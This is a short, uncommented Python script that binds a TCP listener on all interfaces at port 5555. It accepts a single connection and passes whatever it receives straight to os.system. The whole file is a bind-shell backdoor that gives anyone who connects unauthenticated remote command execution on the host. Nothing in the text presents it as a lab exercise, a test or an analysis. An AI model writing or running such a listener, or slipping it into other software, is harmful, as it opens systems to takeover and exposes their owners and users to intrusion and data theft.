import socket, os
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 5555))
sock.listen(1)
conn, addr = sock.accept()
cmd = conn.recv(4096)
os.system(cmd.decode())